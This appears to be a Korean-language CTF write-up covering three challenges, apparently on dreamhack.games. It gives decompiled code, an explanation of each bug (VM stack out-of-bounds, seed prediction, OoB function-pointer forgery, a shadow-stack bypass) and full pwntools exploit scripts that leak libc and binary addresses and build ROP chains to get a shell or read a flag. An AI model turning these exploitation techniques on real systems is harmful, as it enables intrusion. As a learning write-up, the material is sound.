0x347892f0: if true -> rax = 0x34789328 else -> rax = 0x3478a218
0x347892f8: rdx = 0 ; r12 = 4294967295
0x34789310: rdx |= rax
0x34789318: rsp = rdx
0x34789320: invalid ops
0x34789328: rsi = 93966797856896
0x34789338: rdi = 1095002458
0x34789348: xchg edi, eax
0x34789350: rax >>= 6
0x34789358: rax >>= 6
0x34789360: rax >>= 6
0x34789368: rax >>= 6
0x34789370: xchg edi, eax
0x34789378: (QWORD)(var_5576599b6080) = 1095002458
0x34789380: rdi = 1
0x34789390: rdx = 1 ; r12 = 0
0x347893a8: rax = 1
0x347893b8: sys_write(1, 0x5576599b6080, 1) // "\n"
```
리버싱같은 경우에는 마지막에 검증 로직이 한글자씩 박혀있어서 이를 연산하면 구할 수 있다.
## Rev sol
```JavaScript
def encode(input):
    output = ''
    table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    padding = 'QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB'
    input = input.encode()
    for i in range(len(input)//3):
        r = input[i*3:i*3+3]
        tmp = (r[0] << 16) | (r[1] << 8) | (r[2] << 0)
        for j in range(3,-1,-1):
            output += table[(tmp>>(6*j))&63]
    output += padding[len(input):]
    return output 

print(encode('ABCABCABC'))

# AUTH START 0x34786168

FLAG = [0 for i in range(100)]
FLAG[0] = 160 // 2
FLAG[1] = 320 // 2 // 2
FLAG[2] = 0x27800000 >> 0x17
FLAG[3] = 3926177678 >> 6 >> 6
FLAG[3] &= 0xff
FLAG[4] = 260 //2 //2
FLAG[5] = (1039200116 & 4286578688) >> 0x17
FLAG[6] = 684128790 >> 6 >> 6
FLAG[6] &= 0xff
FLAG[7] = 428//2//2
FLAG[8] = (4286578688&799156286) >> 0x17
FLAG[9] = 1578560217 >> 6 >> 6
FLAG[9] &= 0xff
FLAG[10] = 444//2 //2
FLAG[11] = (1002022558&4286578688) >> 0x17
FLAG[12] = 2256925353 >> 6 >> 6
FLAG[12] &= 0xff
FLAG[13] = 444 // 2 // 2
FLAG[14] = (941616977 & 4286578688) >> 0x17
FLAG[15] = 3418772988 >> 6 >> 6
FLAG[16] &= 0xff
FLAG[17] = 440 // 2// 2
FLAG[18] = (797988891&4286578688) >> 0x17
FLAG[19] = 1995915979 >> 6 >> 6
FLAG[19] &= 0xff
FLAG[20] = 416 // 2// 2
FLAG[21] = (848734036&4286578688) >> 0x17
FLAG[22] = 3608542792 >> 6 >> 6
FLAG[22] &= 0xff
FLAG[23] = 412 // 2// 2
FLAG[24] = (4286578688 & 816513309) >> 0x17
FLAG[25] = 3969338450 >> 6 >> 6
FLAG[25] &= 0xff
FLAG[26] = 404 // 2//2
FLAG[27] = (802522653&4286578688) >> 0x17
FLAG[28] = 3063290591 >> 6 >> 6
FLAG[29] &= 0xff
FLAG[30] = 440 //2 //2
FLAG[31] = (843560064&4286578688) >> 0x17
FLAG[32] = 2364930504 >> 6 >>6
FLAG[32] &= 0xff
FLAG[33] = 428 // 2//2
FLAG[34] = (883494366&4286578688) >> 0x17
FLAG[35] = 927384544>> 6>> 6
FLAG[35] &= 0xff
FLAG[36] = 432 // 2 // 2
FLAG[37] = (805135607&4286578688) >> 0x17
FLAG[38] = 2395425389 >> 6 >> 6
FLAG[39] &= 0xff
FLAG[40] = 416 // 2// 2
FLAG[41] = (851439545 & 4286578688) >> 0x17
FLAG[42] = 4091936035 >> 6>> 6
FLAG[42] &=0xff
FLAG[43] = 400//2//2
FLAG[44] = (888487573&4286578688) >> 0x17
FLAG[45] = 414588904 >> 6 >> 6
FLAG[45] &= 0xff
FLAG[46] = 392 //2 //2
FLAG[47] = (912316478&286578688) >> 0x17
FLAG[48] = 1699151259 >> 6>>6
FLAG[48] &= 0xff
for i in FLAG:
    print(chr(i),end='')
# POKA{ok_now_open_the_gate_and_kill_the_diablo}
```
## Exploit
```JavaScript
0x347853c0: rsp = rdx // rsp = main+0x70 // back to menu
-------- print() ---------
0x347853c8: rax = 880321056
0x347853d8: inc idx ; stack[idx] = rsp ; rsp = 0x3478a220
0x347853e0: rdx = 880300912 ; r12 = 0
0x347853f8: rsp = rdx // rsp = main+0x70 // back to menu
-------- exit() ---------
0x34785400: rax = 880301120
0x34785410: inc idx ; stack[idx] = rsp ; rsp = 0x34785440
0x34785418: rdx = 880300912 ; r12 = 0
0x34785430: rsp = rdx // rsp = main+0x70 // back to menu
-------- function_4() ---------
0x34785438: mov rsp, rbp ; pop rbp
-------- exit_internal() ---------
0x34785440: rdx = 16 ; r12 = 0
0x34785458: rsi = 93966797815986
0x34785468: rdi = 1
0x34785478: rax = 1
0x34785488: sys_write(1, 0x5576599ac0b2, 16) // "really? <y/n>\n> "
0x34785490: rdi = 0
0x347854a0: rsi = 93966797857408
0x347854b0: rdx = 2 ; r12 = 0
0x347854c8: rax = 0
0x347854d8: sys_read(0, buf_5576599b6280, 2)
0x347854e0: rdi = 2681
0x347854f0: rax = 93966797857408
```
mov rsp, rbp ; pop rbp는 DOS 취약점으로 이어질 수 있다.
```JavaScript
-------- function_4() ---------
0x34785438: mov rsp, rbp ; pop rbp
-------- exit_internal() ---------
0x34785440: rdx = 16 ; r12 = 0
0x34785458: rsi = 93966797815986
0x34785468: rdi = 1
0x34785478: rax = 1
0x34785488: sys_write(1, 0x5576599ac0b2, 16) // "really? <y/n>\n> "
0x34785490: rdi = 0
0x347854a0: rsi = 93966797857408
0x347854b0: rdx = 2 ; r12 = 0
0x347854c8: rax = 0
0x347854d8: sys_read(0, buf_5576599b6280, 2)
0x347854e0: rdi = 2681
0x347854f0: rax = 93966797857408
0x34785500: rax = (QWORD)(buf_5576599b6280)
0x34785508: rsi = 65535
0x34785518: eax &= esi // eax &= 65535
0x34785520: rax -= rdi // rax -= 2681
0x34785528: rax = 880300112
0x34785538: rdx = 880301408 ; r12 = 0
0x34785550: if true -> rax = 0x34785560 else -> rax = 0x34785050
0x34785558: inc idx ; stack[idx] = rsp ; rsp = rax
0x34785560: rdx = 5 ; r12 = 0
0x34785578: rsi = 93966797815980
0x34785588: rdi = 1
0x34785598: rax = 1
0x347855a8: sys_write(1, 0x5576599ac0ac, 5) // "Bye~\n"
0x347855b0: rdi = 0
0x347855c0: rax = 60
0x347855d0: sys_exit(0)
```
exit internal을 확인해보면, y/n에 따라 복귀 주소를 저장해놓는다.
stack[idx]에 대한 검증이 미흡해 OoB가 가능하다.
  
```JavaScript
0x34785000: rdx = 23 ; r12 = 0
0x34785018: rsi = 93966797815905
0x34785028: rdi = 1
0x34785038: rax = 1
0x34785048: sys_write(1, 0x5576599ac061, 23) // "Simple Base64 Encoder!\n"
```
이러한 가젯들이 존재했는데, 이때 rdx는 나중에 대입된다.
그러면 rdx 쪽 instruction을 건너뛰면, rdx는 잠재적으로 조작될 수 있다.
이를 이용해 .rodata 섹션부터 쭉 메모리를 덤프해서 leak을 달성할 수 있다.
```JavaScript
from pwn import *
import tqdm
# p = process('./lor',env={"LD_PRELOAD":'./libc.so.6'})
libc = ELF('./libc.so.6')
p = remote('host3.dreamhack.games',14676)
for i in tqdm.tqdm(range(0x1040//2)):
    p.sendlineafter(b'>',b'3')
    p.sendlineafter(b'really',b'n')
'''
0x34785000: rdx = 23 ; r12 = 0
0x34785018: rsi = 93966797815905
0x34785028: rdi = 1
0x34785038: rax = 1
0x34785048: sys_write(1, 0x5576599ac061, 23) // "Simple Base64 Encoder!\n"
'''
p.sendlineafter(b'>',b'1')
payload = p64(0x34785018) * 4
pause()
p.sendlineafter(b': ',payload)
rvu = lambda x : p.recvuntil(x)
l = 0 
tar = 8103
while l < tar:
    l += len(p.recv(tar-l))
rv = p.recv()
if l < 0x40:
    rv += p.recv()
 
stdout_ = (u64(rv[0x38:0x38+8]))
print(hex(stdout_))
libc_base = stdout_ - libc.sym._IO_2_1_stdout_
success(hex(libc_base))
bin_base = (u64(rv[:8])) -0x12008
success(hex(bin_base))
p.sendlineafter(b'>',b'1')
payload = p64(bin_base + 0x1A280+0x10)  * 2
payload += p64(libc_base + 0x000000000002a3e5)
payload += p64(libc_base + 0x1d8698)
payload += p64(libc_base + libc.sym.system)
pause()
p.sendafter(b'input: ',payload)
    
p.interactive()
# POKA{now_you_are_the_only_diablo!!rule_the_world}
```
# Broken Dahun's Heart
```JavaScript
  setvbuf(stdout, 0LL, 2, 0LL);
  print_hi();
  alarm(300u);
  init_handles();
  random = 0;
  fd = open("/dev/urandom", 0);
  read(fd, &random, 2uLL);                      // bruteforcable
  close(fd);
  srand(random);
  memset(&s, 0, sizeof(s));
  s.sa_flags = 4;
  s.sa_handler = (__sighandler_t)heal_the_borken_heart;// only called once
  sigaction(SIGSEGV, &s, 0LL);                  // Sigsegv
  memset(&s, 0, sizeof(s));
  s.sa_flags = 4;
  s.sa_handler = (__sighandler_t)exit_handler;
  sigaction(SIGALRM, &s, 0LL);
  v3 = std::operator<<<std::char_traits<char>>(
         &std::cout,
         "We should not let this stupid misunderstanding get in our way. We deserve another chance.");
  ((void (__fastcall *)(__int64, void *))std::ostream::operator<<)(v3, &std::endl<char,std::char_traits<char>>);
  try_again();
}
```
마찬가지로 enum을 정의해서 쓰면된다.
```JavaScript
ucontext_t *__fastcall heal_the_borken_heart(int a1, siginfo_t *a2, ucontext_t *ctx)
{
  ucontext_t *result; // rax
  if ( check > 1 )
    exit(255);
  ++check;
  result = ctx;
  ctx->uc_mcontext.gregs[0x10] = broken_heart_handlers[game_step];
  return result;                                // rip = handler
}                                               //
```
한번에 한하여 heal_the_broken_heart 함수를 호출하며 context가 복구된다.
```JavaScript
std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
  v5 = std::operator<<<std::char_traits<char>>(&std::cout, "5. PROPOSE");
  std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
  std::operator<<<std::char_traits<char>>(&std::cout, "> ");
  std::operator>><char,std::char_traits<char>>(&std::cin, nptr);
  switch ( atoi(nptr) )
  {
    case 1:                                     // money int bug
      mildang();                                // OoB random add or sub
      break;
    case 2:
      call();                                   // charming down
      break;
    case 3:
      sms();                                    // info leak / money unsigned
      break;
    case 4:
      date();                                   // money unsigned
      break;
    case 5:
      propose();
      break;
    default:
      return __readfsqword(0x28u) ^ v8;
  }
  return __readfsqword(0x28u) ^ v8;
}                                               // get
```
```JavaScript
std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
  }
  std::operator<<<std::char_traits<char>>(&std::cout, "Choose: ");
  std::istream::operator>>(&std::cin, &choice);
  if ( i < choice || !sms_list[choice] )        // choice Oob
    broke_again();
  f = rand();
  val = rand();
  v9 = rand();
  money -= v9 % 5000;
  if ( (f & 1) != 0 )
  {
    love_gauge -= f % 10;
    charming -= val % 10;
    v3 = mildang_gauge[choice] - (unsigned __int8)val;
  }
  else
  {
    love_gauge += f % 10;
    charming += val % 10;
    v3 = (unsigned __int8)val + mildang_gauge[choice];
  }
  mildang_gauge[choice] = v3;
```
이때 choice에 대한 OoB addition, subtraction이 가능하다.
이때 약간의 조건들이 있는데 이러한 조건들은 OoB를 통해 해결한다.
```JavaScript
std::operator<<<std::char_traits<char>>(&std::cout, "Phone number: ");
    read(0, buf, 255uLL);
    std::operator<<<std::char_traits<char>>(&std::cout, "Message: ");
    read(0, v13, 255uLL);
    v1 = std::operator<<<std::char_traits<char>>(&std::cout, "[");
    v2 = std::operator<<<std::char_traits<char>>(v1, buf);
    v3 = std::operator<<<std::char_traits<char>>(v2, "]");// info leak
    std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
    v4 = std::operator<<<std::char_traits<char>>(&std::cout, v13);
    std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
    v5 = std::operator<<<std::char_traits<char>>(&std::cout, "Sent!");
    std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
    if ( rand() % 10 )
    {
      v9 = std::operator<<<std::char_traits<char>>(&std::cout, "Oh !!!!!!!!!! She did not replied,, ,, :(!");
      std::ostream::operator<<(v9, &std::endl<char,std::char_traits<char>>);
    }
    else
    {
      v6 = std::operator<<<std::char_traits<char>>(&std::cout, "Oh !!!!!!!!!! She replied,, ,, Yes!");
      std::ostream::operator<<(v6, &std::endl<char,std::char_traits<char>>);
      v7 = rand() % 6;
      v8 = g_sms_index++;
      sms_list[v8] = msg[v7];
    }
  }
```
memory leak이 가능하며 money는 unsigned 비교를 거친다.
이를 이용해 나중에 integer overflow & underflow를 트리거해버리면 된다.
```JavaScript
  money -= 100000;
  v3 = rand();
  if ( !((int)v3 % 0xBEBC200) && charming > 100000 )
  {
    v0 = std::operator<<<std::char_traits<char>>(&std::cout, "Oh!");
    std::ostream::operator<<(v0, v3);
    std::ostream::operator<<();
    Get_shell();
  }
  v1 = std::operator<<<std::char_traits<char>>(&std::cout, "-_-");
  std::ostream::operator<<(v1, v3);
  std::ostream::operator<<();
  return broke_again();
}
```
4바이트 정도는 충분히 bruteforce로 뚫을만하다.
하지만 charming을 증가시키려 앞선 random들을 뚫으려면 300초안에 불가능하다.
## Exploit
```JavaScript
# 1) srand seed prediction is possible. cuz it is only 2 bytes long.
# 2) info leak is possible u can get the base of binary, stack
# 3) place get shell func through OoB add
# 4) modify gamestep to exec that func
from pwn import *
import ctypes
libc = ctypes.CDLL('/usr/lib/x86_64-linux-gnu/libc.so.6')
def seed_brute(arr):
    global libc
    ret = []
    for i in range(0x10000):
        libc.srand(i)
        f = 1
        for j in arr:
            if j != (libc.rand()%10):
                f = 0
                break
        if f:
            ret.append(i)
    return ret
            
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
rvu = lambda x : p.recvuntil(x)
# p = process('./bdh')
p = remote('host3.dreamhack.games',20804)
def get_charm():
    sla(b'> ',b'2')
    rvu(b'[Charming Point]: ')
    n = int(rvu(b'.')[:-1])
    return n
res = []
diff = 500
for i in range(0x20):
    v = get_charm()
    diff -= v
    res.append(diff)
    diff = v
ret = seed_brute(res)
assert len(ret) == 1
ret = ret[0]
success(f'seed : {ret}')
libc.srand(ret)
for i in range(len(res)):
    libc.rand()
sla(b'> ',b'3')
pay = b'A'*0xa8
sa(b': ', pay)
pay = b'A'*0x40
sa(b': ', pay)
rvu(b'A'*0xa8)
libc_base = u64(rvu(b']')[:-1].ljust(8,b'\x00')) - 0x8aeed
success(hex(libc_base))
rvu(b'A'*0x40)
bin_base = u64(rvu(b'\x0a')[:-1].ljust(8,b'\x00')) - 0x81a0
success(hex(bin_base))
if ((libc.rand()%10) == 0):
    libc.rand()
# functon ptr
# -824 -> binary_ptr
# ptr diff rw - 0x5fb1

# lovegauge 
# oob idx -> -101 * 8
def oob_add(idx, x):
    global libc
    while True:
        r = libc.rand()
        is_add = not (r&1)
        if is_add:
            val = (libc.rand()) & 0xff
            # success(f'adding: {hex(x)}')
            x -= val
            libc.rand()
            sla(b'> ',b'1')
            sla(b'Choose: ',str(idx))
            if x <= 0:
                break
        else:
            sla(b'> ',b'2')
 
def oob_sub(idx, x,f):
    global libc
    while True:
        is_sub = (libc.rand()&1)
        if is_sub:
            if f==0:
                val = (libc.rand()) % 10
            else:
                val = (libc.rand()) & 0xff
            # success(f'subtracting: {hex(x)}')
            if f:
                if (x - val) < 0:
                    sla(b'> ',b'2')
                    sla(b'> ',b'2')
                    continue
            x -= val
            libc.rand()
            sla(b'> ',b'1')
            # if idx == -102:
            #     print(hex(val))
            #     pause()
            
            sla(b'Choose: ',str(idx))
            rvu(b'[Love Gauge]: ')
            n = int(rvu(b'.')[:-1])
            if f:
                if n < 0:
                    oob_add(-101, 0x50)
            if f:
                if x == 0:
                    break
            else:
                if x <= 0:
                    break
        else:
            sla(b'> ',b'2')
def oob_sub_at_once(idx, x):
    global libc
    while True:
        is_sub = (libc.rand()&1)
        if is_sub:
            val = (libc.rand()) & 0xff
            # success(f'subtracting: {hex(x)}')
            if val != x:
                sla(b'> ',b'2')
                sla(b'> ',b'2')
                continue
            x -= val
            libc.rand()
            sla(b'> ',b'1')
            sla(b'Choose: ',str(idx))
            if x == 0:
                break
        else:
            sla(b'> ',b'2')

oob_sub(-0x67, 0x5fb1, 1) # preparing function ptr
success(b'prepared fptr')
r = libc.rand()
sla(b'> ',b'2')
rvu(b'[Love Gauge]: ')
n = int(rvu(b'.')[:-1])
success(f'gauge: {n}')
x = n + 200
while True:
    tmp = libc.rand()
    is_sub = (tmp&1)
    if is_sub:
        libc.rand()
        val = tmp % 10
        if (x - val) < 0:
            sla(b'> ',b'2')
            sla(b'> ',b'2')
            continue
        x -= val
        libc.rand()
        sla(b'> ',b'1')
        sla(b'Choose: ',str(-100))
        if x == 0:
            break
    else:
        sla(b'> ',b'2')
rvu(b'[Love Gauge]: ')
n = int(rvu(b'.')[:-1])
success(f'gauge: {n}')
pause()
oob_sub_at_once(-102, 1+0x77) # preparing function ptr
p.interactive()
# KAPO{ac98a027d8c41b726576b169f4c5bba187be5bb2d3a9e88523f5ea0a2264ef4a}
```
gamestep을 덮고, 마지막에 SIGSEGV를 내주면 handler가 호출되면서 임의 주소에 대한 호출 primitive를 만들 수 있다.
미리 OoB addition으로 함수 포인터 주소를 만들고 idx를 변조해 임의 주소에 대한 호출을 통해 shell을 획득한다.
# Avatar: Crude Shadow
```JavaScript
push_shadow(&shadow_sp, shadow_stack);
  setup();
  init_seccomp();                               // useless
  puts("shadow test");
  exit = 0;
  do
  {
    menu();
    __isoc99_scanf("%d");
    switch ( in )
    {
      case 1:
        print_shadow(shadow_sp, shadow_stack);
        break;
      case 2:
        puts("string input:");
        read(0, buf, 0x400uLL);
        break;
      case 3:
        nested_func(&shadow_sp, shadow_stack);
        break;
      case 4:
        puts("lol you can't");
        break;
      case 5:
        exit = 1;
        break;
      default:
        puts("nono");
        break;
    }
  }
  while ( !exit );
  print_shadow(shadow_sp, shadow_stack);
  pop_shadow(&shadow_sp, shadow_stack);
  return 0;
}
```
shadow stack이 구현되어있다.
bof도 대놓고 준다.
## Exploit
```JavaScript
from pwn import *
sla = lambda x,y :p.sendlineafter(x,y)
rvu = lambda x : p.recvuntil(x)
\#p = process('./avatar',env={'LD_PRELOAD':'../libc.so.6'})
p = remote('host3.dreamhack.games',10351)
context.binary = e = ELF('./avatar')
libc = ELF('../libc.so.6')
sla(b'5',b'3')
sla(b'2',b'1')
rvu(b':\n')
libc_base = int(rvu('\n')[:-1],16) - 0x29d90
bin_base  = int(rvu('\n')[:-1],16) - 0x1782
success(hex(libc_base))
success(hex(bin_base))
sla(b'2',b'2')
sla(b'2',b'2')
payload = b''
payload += p64(libc_base + 0x0000000000029cd6)
payload += b'A'*0x50
payload += p64(11)
payload += p64(libc_base + 0x0000000000029cd6)
payload += p64(libc_base + 0x0000000000029cd6)
prdi = p64(libc_base + 0x000000000002a3e5)
prax = p64(libc_base + 0x0000000000045eb0)
prsi = p64(libc_base + 0x000000000002be51)
prdxr12 = p64(libc_base + 0x000000000011f497)
payload += prdi
payload += p64(0)
payload += prsi
payload += p64(e.bss() + bin_base+ 0x500)
payload += prdxr12
payload += p64(0x200)*2
payload += p64(libc_base + libc.sym.read)
payload += prdi
payload += p64(e.bss() + bin_base + 0x500)
payload += prsi
payload += p64(0)
payload += prdxr12
payload += p64(0)*2
payload += p64(libc_base + libc.sym.open)
payload += prdi
payload += p64(3)
payload += prsi
payload += p64(e.bss() + bin_base+ 0x500)
payload += prdxr12
payload += p64(0x200)*2
payload += p64(libc_base + libc.sym.read)
payload += prdi
payload += p64(1)
payload += prsi
payload += p64(e.bss() + bin_base+ 0x500)
payload += prdxr12
payload += p64(0x200)
payload += p64(0x200)
payload += p64(libc_base + libc.sym.write)
success(hex(len(payload)))
prdxr12 = p64(libc_base + 0x000000000011f497)
p.sendafter(b'input:',payload)
p.sendafter(b'5',b'5')
sleep(0.2)
pause()
p.send(b'../flag')
p.interactive()
# POKA{150_PLUS_ISO_T0T4L_300_HE4D}
```